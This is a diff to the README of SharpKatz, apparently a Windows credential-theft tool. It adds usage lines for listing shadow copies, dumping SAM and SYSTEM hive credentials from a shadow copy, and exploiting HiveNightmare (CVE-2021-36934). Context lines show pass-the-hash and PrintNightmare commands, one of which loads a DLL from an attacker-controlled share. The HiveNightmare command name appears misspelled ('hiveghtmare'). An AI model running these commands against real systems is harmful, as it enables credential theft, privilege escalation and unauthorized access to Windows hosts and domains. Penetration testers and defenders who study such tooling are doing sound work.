@@ -45,6 +45,18 @@ Retrive user credentials from WDigest provider <br>
 Retrive user credentials from all providers <br>
 <br>
 
+### List shadowcopies
+
+```SharpKatz.exe --Command listshadows```<br>
+Enumerate shadowcopies with NtOpenDirectoryObject and NtQueryDirectoryObject<br>
+<br>
+
+### Lsadumpsam
+
+```SharpKatz.exe --Command dumpsam --System \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM --Sam \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM```<br>
+Dump credential from provided sam database<br>
+<br>
+
 ### Pth
 
 ```SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash```<br>
@@ -110,6 +122,13 @@ Perform PrintNightmare attack <br>
 ```SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom```<br>
 Perform PrintNightmare attack with provided credentials<br>
 <br>
+
+### HiveNightmare CVE-2021-36934
+
+```SharpKatz.exe --Command hiveghtmare```<br>
+Exploit HiveNightmare vulnerability selecting the first available shadowcopy <br>
+<br>
+
 
 ## Credits
 
